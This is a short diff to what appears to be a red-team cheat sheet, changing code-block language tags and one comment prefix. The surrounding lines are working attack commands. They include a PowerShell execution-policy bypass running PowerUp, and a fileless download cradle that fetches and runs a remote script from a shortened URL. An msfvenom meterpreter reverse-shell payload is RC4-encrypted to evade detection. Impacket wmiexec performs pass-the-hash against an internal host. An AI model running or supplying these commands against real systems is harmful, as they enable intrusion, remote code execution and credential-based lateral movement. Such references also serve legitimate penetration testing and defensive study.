@@ -163,7 +163,7 @@ Find-LAPSDelegatedGroups
 
 #### PowerUp
 
-```cpp
+```py
 powershell.exe -nop -exec bypass
 Import-Module PowerUp.ps1
 Invoke-AllChecks | Out-File -Encoding ASCII Allchecks.txt
@@ -171,7 +171,7 @@ Invoke-AllChecks | Out-File -Encoding ASCII Allchecks.txt
 
 If you want to invoke everything without touching disk, use something like this:
 
-```cpp
+```py
 powershell -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString(‘http://bit.ly/1mK64oH’); Invoke-AllChecks”
 ```
 
@@ -305,7 +305,7 @@ powershell -Sta -Nop -Window Hidden -EncodedCommand <encodedCommand>
 
 ```py
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.239 LPORT=4444 -f raw -o meter.bin
-/cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin
+//cat meter.bin | openssl enc -rc4 -nosalt -k "HideMyShellzPlz?" > encmeter.bin
 xxd -i encmeter.bin
 ```
 
@@ -325,6 +325,6 @@ echo $encodedcommand
 
 ##### Impacket
 Impacket is a collection of Python classes for working with network protocols
-```cpp
+```py
 proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes e353da88f9c4331504f70d471f0f9cb1:REDACTED a.user@10.10.120.1
 ```
